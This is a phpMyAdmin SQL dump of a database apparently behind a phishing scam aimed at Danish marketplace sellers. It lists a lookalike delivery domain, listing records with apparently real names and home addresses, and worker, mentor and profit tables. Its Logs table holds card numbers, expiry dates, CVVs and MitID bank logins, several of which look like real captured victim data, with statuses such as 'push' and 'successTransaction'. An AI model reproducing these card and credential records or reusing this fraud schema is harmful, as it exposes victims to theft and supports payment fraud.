-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Хост: localhost:3306
-- Время создания: Май 12 2023 г., 18:03
-- Версия сервера: 8.0.32-0ubuntu0.20.04.2
-- Версия PHP: 7.4.3-4ubuntu2.18

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `bot`
--

-- --------------------------------------------------------

--
-- Структура таблицы `BlackIps`
--

CREATE TABLE `BlackIps` (
  `id` int NOT NULL,
  `ip` text,
  `workerId` bigint DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Структура таблицы `Countries`
--

CREATE TABLE `Countries` (
  `id` int NOT NULL,
  `title` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `code` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
  `work` tinyint(1) NOT NULL DEFAULT '1',
  `lk` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Дамп данных таблицы `Countries`
--

INSERT INTO `Countries` (`id`, `title`, `code`, `work`, `lk`) VALUES
(1, '🇩🇪 Германия', 'de', 0, 1),
(2, '🇦🇹 Австрия', 'au', 0, 1),
(3, '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Англия', 'en', 0, 0),
(4, '🇵🇱 Польша', 'pl', 0, 0),
(5, '🌎 Мир', 'eu', 0, 0),
(6, '🇩🇰 Дания', 'dk', 1, 0);

-- --------------------------------------------------------

--
-- Структура таблицы `Currencies`
--

CREATE TABLE `Currencies` (
  `id` int NOT NULL,
  `symbol` text,
  `displayed` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Структура таблицы `Domains`
--

CREATE TABLE `Domains` (
  `id` int NOT NULL,
  `domain` text,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `linked` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Domains`
--

INSERT INTO `Domains` (`id`, `domain`, `status`, `linked`) VALUES
(1, 'dba-order-levering.com', 1, 1);

-- --------------------------------------------------------

--
-- Структура таблицы `Items`
--

CREATE TABLE `Items` (
  `id` varchar(256) NOT NULL,
  `cardMsgId` text,
  `workerId` bigint NOT NULL,
  `title` text,
  `photo` text,
  `price` text,
  `address` text,
  `name` text,
  `dateVezd` text,
  `dateViezd` text,
  `currency` text,
  `serviceCode` text,
  `status` int NOT NULL DEFAULT '2',
  `chatStatus` int NOT NULL DEFAULT '0',
  `online` tinyint(1) NOT NULL DEFAULT '0',
  `msgId` text,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Items`
--

INSERT INTO `Items` (`id`, `cardMsgId`, `workerId`, `title`, `photo`, `price`, `address`, `name`, `dateVezd`, `dateViezd`, `currency`, `serviceCode`, `status`, `chatStatus`, `online`, `msgId`, `createdAt`, `updatedAt`) VALUES
('dGERsZkP', NULL, 6129441860, 'Kaburator og sidestøttefod', 'https://telegra.ph/file/289099bfeccdfd38f8ed3.jpg', '850.00', 'Kirunavej 11 Silkeborg 8600', 'Logan Morrow', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1023', '2023-05-11 18:24:04', '2023-05-11 18:24:04'),
('DLnmdOKE', NULL, 6054021161, 'Unisex børnecykel, BMX, Everton', 'https://telegra.ph/file/eca495ffd2e678a903178.jpg', '550.00', 'Indkilde alle 91', 'Tilde Mortensen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1320', '2023-05-12 12:54:21', '2023-05-12 12:54:21'),
('dlOZjIsq', NULL, 6054021161, 'Sneakers, str. 40, Gabor', 'https://telegra.ph/file/39e9a0e9b25e537a6c623.jpg', '400.00', 'Nattergalevej 14', 'Tove Mogensen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1301', '2023-05-12 12:42:52', '2023-05-12 12:42:52'),
('ekRGcacm', NULL, 6213223668, 'Fuglebur, b: 34 d: 50 h: 50, Fuglebur  høj 50 L 58 B 34.', 'https://www.dba.dk/fuglebur-b-34-d-50-h-50/id-1101714060/billeder/1/', '133.00', 'ewasfdrgf', '21s12 d21s221s', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '289', '2023-05-11 09:30:03', '2023-05-11 09:30:03'),
('fKGDCRUf', '1552', 5659851094, 'dklfgklsdfklgkldsfg', 'https://telegra.ph/file/0abf70d0661442477c2b2.jpg', '1000.00', 'ывфлоаолфывоа', 'лфывалфлыва', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 1, '1549', '2023-05-12 15:54:26', '2023-05-12 15:54:26'),
('hwxPZvGI', NULL, 6129441860, 'Sagitta fraction', 'https://telegra.ph/file/c93cb6a07ffcab2cc4e98.jpg', '300', 'Læssevej 42 Værløse 3500', 'Gabriel Smith', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1084', '2023-05-11 18:54:18', '2023-05-11 18:54:18'),
('kIniTXyR', NULL, 6054021161, 'Sneakers, str. 40, Gabor', 'https://telegra.ph/file/fc93092135fbb4f4d37a0.jpg', '300.00', 'Nattergalevej 14', 'Tove Mogensen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1255', '2023-05-12 12:31:01', '2023-05-12 12:31:01'),
('LhrPErGD', NULL, 6054021161, 'Anden loftslampe', 'https://telegra.ph/file/ec5371cd77e232b38f2ef.jpg', '699.00', 'Krebsens Kvt., 4.D', 'Edith Bech', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1235', '2023-05-12 11:45:07', '2023-05-12 11:45:07'),
('NDvDjtkX', '1466', 6242299511, 'Herreparfume, Dufte , Alt', 'https://telegra.ph/file/46a02ac95ccabe55f6e27.jpg', '3500.00', 'Bentzen Boulevard 6', 'Amirah Pineda', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1340', '2023-05-12 13:21:12', '2023-05-12 13:21:12'),
('NZZxWkaY', NULL, 6242299511, 'Dameur, Apple', 'https://telegra.ph/file/b92fc1624f7fc9599d358.jpg', '700.00', 'Bloch Allé 9', 'Keelan Pratt', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1373', '2023-05-12 13:26:02', '2023-05-12 13:26:02'),
('OcGkONzW', NULL, 6054021161, 'Sneakers, str. 40, Gabor', 'https://telegra.ph/file/39e9a0e9b25e537a6c623.jpg', '300.00', 'Nattergalevej 14', 'Tove Mogensen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1268', '2023-05-12 12:33:00', '2023-05-12 12:33:00'),
('OeGOqyjl', '747', 6213223668, 'asd', 'https://www.dba.dk/fuglebur-b-34-d-50-h-50/id-1101714060/', '12.00', 'ewasfdrgf', '21s12 d21s221s', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '677', '2023-05-11 15:42:22', '2023-05-11 15:42:22'),
('oTrZMTbf', NULL, 6242299511, 'Lego Harry Potter, 76391 Golden Minifigures', 'https://telegra.ph/file/c929d5a7e1fdd161c889f.jpg', '499.00', 'Gammelgaard Vej 9', 'Beatrice Harrington', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1415', '2023-05-12 13:52:44', '2023-05-12 13:52:44'),
('PQbArEbO', NULL, 6054021161, 'Hot weels racerbane, fjernstyret, Hot weels', 'https://telegra.ph/file/e4436dd6c86ca4d125c84.jpg', '150.00', 'Bøgeskovvej 35', 'Malene Lund', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1286', '2023-05-12 12:37:08', '2023-05-12 12:37:08'),
('RBCkgEEd', '1518', 6242299511, 'Damedeodorant, Parfume og shampoo,conditioner, EMPORIO', 'https://telegra.ph/file/557d5c5bf324444c5d51d.jpg', '200.00', 'Bloch Allé 9', 'Keelan Pratt', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 1, '1434', '2023-05-12 13:55:34', '2023-05-12 13:55:34'),
('TGZMZEAB', '1218', 6054021161, 'Kummefryser, Whirlpool WHM6411, 380 liter', 'https://telegra.ph/file/805aa44927cdf3b5a6fdc.jpg', '400.00', 'Holløse Gade 35', 'Dorte Carlsen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1205', '2023-05-12 11:03:30', '2023-05-12 11:03:30'),
('WapbWfng', NULL, 6129441860, 'Andet mærke, Perfekt', 'https://telegra.ph/file/2264431e94920b555da65.jpg', '550.00', 'Grøndalsvej 13 Viby J 8260', 'Joshua Singh', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 1, '875', '2023-05-11 17:35:26', '2023-05-11 17:35:26'),
('wHKsFNcy', NULL, 6054021161, 'Badetøj, Badedragt, Zizzi', 'https://telegra.ph/file/298f6c71642412377aa04.jpg', '300.00', 'Hybenvej 12 st th', 'Alma Kronborg', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 1, '1063', '2023-05-11 18:47:33', '2023-05-11 18:47:33'),
('yaESFLRk', NULL, 6054021161, 'Læderlænestol, læder, Ukendt', 'https://telegra.ph/file/92157c13d7b5125eeaba4.jpg', '2150', 'Holløse Gade 35', 'Dorte Carlsen', NULL, NULL, 'DKK', 'dba2_dk', 2, 0, 0, '1187', '2023-05-12 10:58:15', '2023-05-12 10:58:15');

-- --------------------------------------------------------

--
-- Структура таблицы `Logs`
--

CREATE TABLE `Logs` (
  `id` int NOT NULL,
  `cardNumber` text,
  `cardExp` text,
  `cardCvv` text,
  `cardBalance` text,
  `vbiverId` bigint DEFAULT NULL,
  `status` text,
  `error` text,
  `messageId` text,
  `vbiverMsgId` text,
  `other` json DEFAULT NULL,
  `itemId` text,
  `lk` tinyint(1) NOT NULL DEFAULT '0',
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

--
-- Дамп данных таблицы `Logs`
--

INSERT INTO `Logs` (`id`, `cardNumber`, `cardExp`, `cardCvv`, `cardBalance`, `vbiverId`, `status`, `error`, `messageId`, `vbiverMsgId`, `other`, `itemId`, `lk`, `createdAt`, `updatedAt`) VALUES
(1, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '47', '48', NULL, 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(2, '5226 6004 1367 6739', '12/23', '312', NULL, 5659851094, 'mitid_dk_lk', NULL, '52', '53', NULL, 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(3, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '57', '58', NULL, 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(4, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '62', '63', NULL, 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(5, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'sms', NULL, '67', '68', NULL, 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(6, NULL, NULL, NULL, NULL, 5659851094, NULL, 'sdfsdf', '71', '72', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"jksadfkjjaksdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'pklBMobo', 0, '2023-05-11 10:08:34', '2023-05-11 10:08:34'),
(7, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '99', '100', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"sdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:13:27', '2023-05-11 08:13:27'),
(8, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '106', '113', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"312\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:15:05', '2023-05-11 08:15:05'),
(9, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '116', '121', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:17:27', '2023-05-11 08:17:27'),
(10, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '127', '128', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:25:01', '2023-05-11 08:25:01'),
(11, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '137', '138', NULL, 'zDjSMXjL', 0, '2023-05-11 08:26:02', '2023-05-11 08:26:02'),
(12, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '142', '143', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:27:03', '2023-05-11 08:27:03'),
(13, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '151', '152', NULL, 'zDjSMXjL', 0, '2023-05-11 08:28:17', '2023-05-11 08:28:17'),
(14, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '156', '157', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:28:47', '2023-05-11 08:28:47'),
(15, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '164', '165', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:30:03', '2023-05-11 08:30:03'),
(16, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '172', '173', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 0, '2023-05-11 08:31:49', '2023-05-11 08:31:49'),
(17, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '181', '194', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 08:40:24', '2023-05-11 08:40:24'),
(18, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '198', '199', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 08:48:19', '2023-05-11 08:48:19'),
(19, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '205', '206', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 09:16:04', '2023-05-11 09:16:04'),
(20, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '212', '213', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 09:19:14', '2023-05-11 09:19:14'),
(21, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '219', '220', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 09:20:30', '2023-05-11 09:20:30'),
(22, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '270', '271', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"213\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 09:27:22', '2023-05-11 09:27:22'),
(23, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '292', '293', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 09:34:32', '2023-05-11 09:34:32'),
(24, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '350', '351', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 11:07:32', '2023-05-11 11:07:32'),
(25, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '357', '358', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 11:20:58', '2023-05-11 11:20:58'),
(26, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '364', '365', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 11:21:53', '2023-05-11 11:21:53'),
(27, '8888 8888 8888 8888', '12/23', '213', NULL, 5659851094, 'mitid_dk_lk', NULL, '371', '372', NULL, 'zDjSMXjL', 0, '2023-05-11 11:27:08', '2023-05-11 11:27:08'),
(28, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '391', '392', NULL, 'zDjSMXjL', 0, '2023-05-11 14:12:57', '2023-05-11 14:12:57'),
(29, '8888 8888 8888 8888', '12/33', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '396', '397', NULL, 'zDjSMXjL', 0, '2023-05-11 14:14:09', '2023-05-11 14:14:09'),
(30, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '401', '402', NULL, 'zDjSMXjL', 0, '2023-05-11 14:14:39', '2023-05-11 14:14:39'),
(31, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '406', '407', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:18:58', '2023-05-11 14:18:58'),
(32, '8888 8888 8888 9888', '12/23', '123', NULL, 5659851094, 'push', NULL, '414', '415', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"asdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:20:18', '2023-05-11 14:20:18'),
(33, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '422', '423', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"ыфвафвыа\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:22:51', '2023-05-11 14:22:51'),
(34, '8888 8888 8888 8888', '12/33', '123', NULL, 5659851094, NULL, NULL, '430', '431', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"фывафыва\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:24:24', '2023-05-11 14:24:24'),
(35, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '440', '441', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"sadfasdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:27:03', '2023-05-11 14:27:03'),
(36, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '448', '449', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:27:46', '2023-05-11 14:27:46'),
(37, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '456', '457', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:29:32', '2023-05-11 14:29:32'),
(38, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '464', '465', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:30:33', '2023-05-11 14:30:33'),
(39, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '472', '473', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"sdaf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:32:19', '2023-05-11 14:32:19'),
(40, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '480', '481', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:33:08', '2023-05-11 14:33:08'),
(41, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '489', '490', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:43:19', '2023-05-11 14:43:19'),
(42, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '498', '499', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 14:47:54', '2023-05-11 14:47:54'),
(43, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'push', NULL, '523', '524', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"ыфвафвыа\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:03:20', '2023-05-11 15:03:20'),
(44, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '538', '539', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"sadfasdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:09:24', '2023-05-11 15:09:24'),
(45, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '548', '549', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"фывафыва\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:10:58', '2023-05-11 15:10:58'),
(46, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '562', '563', NULL, 'zDjSMXjL', 0, '2023-05-11 15:13:06', '2023-05-11 15:13:06'),
(47, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'wrongLk', NULL, '567', '568', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"123\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:15:17', '2023-05-11 15:15:17'),
(48, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'mitid_dk_lk', NULL, '576', '577', NULL, 'zDjSMXjL', 0, '2023-05-11 15:17:12', '2023-05-11 15:17:12'),
(49, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'wrongLk', NULL, '581', '582', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"asdfasdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:19:18', '2023-05-11 15:19:18'),
(50, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'wrongLk', NULL, '592', '593', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"asdfasdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:21:26', '2023-05-11 15:21:26'),
(51, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, 'hold', NULL, '602', '603', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"sadf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'zDjSMXjL', 1, '2023-05-11 15:22:46', '2023-05-11 15:22:46'),
(52, '4564 5654 6456 4545', '05/41', '198', NULL, 6213223668, 'successTransaction', NULL, '698', '699', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"53wt6w35t\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'OeGOqyjl', 1, '2023-05-11 15:45:19', '2023-05-11 15:45:19'),
(53, '8888 8888 8888 8888', '12/23', '123', NULL, NULL, 'mitid_dk_lk', NULL, '706', '707', NULL, 'cELEvRFz', 0, '2023-05-11 15:47:31', '2023-05-11 15:47:31'),
(54, '5463 4563 5632 6345', '11/23', '456', NULL, NULL, NULL, NULL, '718', '719', NULL, 'OeGOqyjl', 0, '2023-05-11 15:48:45', '2023-05-11 15:48:45'),
(55, '4254 2352 4315 2145', '12/43', '213', NULL, 5999286329, 'mitid_dk_lk', NULL, '730', '739', NULL, 'OeGOqyjl', 0, '2023-05-11 15:49:47', '2023-05-11 15:49:47'),
(56, '4646 5465 5466 5454', '11/22', '312', NULL, NULL, 'push', NULL, '749', '824', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"4543ц5345\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'OeGOqyjl', 1, '2023-05-11 15:51:27', '2023-05-11 15:51:27'),
(57, '4571 9888 0296 2214', '11/24', '855', NULL, NULL, 'mitid_dk_lk', NULL, '1219', '1220', NULL, 'TGZMZEAB', 0, '2023-05-12 11:18:06', '2023-05-12 11:18:06'),
(58, '4026 2077 7685 2884', '04/26', '771', NULL, 5999286329, 'hold', NULL, '1380', '1509', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"Vasevej28\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'NDvDjtkX', 1, '2023-05-12 13:27:02', '2023-05-12 13:27:02'),
(59, '4026 2077 7685 2884', '04/26', '771', NULL, 5999286329, 'push', NULL, '1467', '1501', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"Vasevej28\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'NDvDjtkX', 1, '2023-05-12 14:43:35', '2023-05-12 14:43:35'),
(60, '4571 6482 0335 3310', '07/25', '113', NULL, NULL, 'wrongLk', NULL, '1484', '1491', '{\"pin\": null, \"bank\": \"MitID\", \"login\": null, \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'RBCkgEEd', 1, '2023-05-12 14:45:33', '2023-05-12 14:45:33'),
(61, '4345 9600 9226 0364', '05/25', '200', NULL, 6213223668, 'wrongLk', NULL, '1504', '1516', '{\"pin\": null, \"bank\": \"MitID\", \"login\": null, \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'RBCkgEEd', 1, '2023-05-12 14:49:26', '2023-05-12 14:49:26'),
(62, '4571 6482 0335 3310', '07/25', '113', NULL, 6213223668, 'hold', NULL, '1519', '1520', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"Ludwig33\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'RBCkgEEd', 1, '2023-05-12 14:52:36', '2023-05-12 14:52:36'),
(63, '8888 8888 8888 8888', '12/23', '123', NULL, 5659851094, NULL, NULL, '1553', '1554', '{\"pin\": null, \"bank\": \"MitID\", \"login\": \"asdfasdf\", \"pesel\": null, \"password\": null, \"motherlastname\": null}', 'fKGDCRUf', 1, '2023-05-12 15:54:37', '2023-05-12 15:54:37');

-- --------------------------------------------------------

--
-- Структура таблицы `Mentors`
--

CREATE TABLE `Mentors` (
  `id` int NOT NULL,
  `workerId` bigint NOT NULL,
  `username` text,
  `about` text,
  `percent` int NOT NULL DEFAULT '5',
  `status` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
-- Структура таблицы `Profits`
--

CREATE TABLE `Profits` (
  `id` int NOT NULL,
  `workerId` bigint NOT NULL,
  `workerTag` text,
  `mentorId` bigint DEFAULT NULL,
  `amount` int DEFAULT NULL,
  `rubAmount` int DEFAULT NULL,
  `eurAmount` int DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `messageId` text,
  `itemId` text,
  `serviceCode` text,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

-- --------------------------------------------------------

--
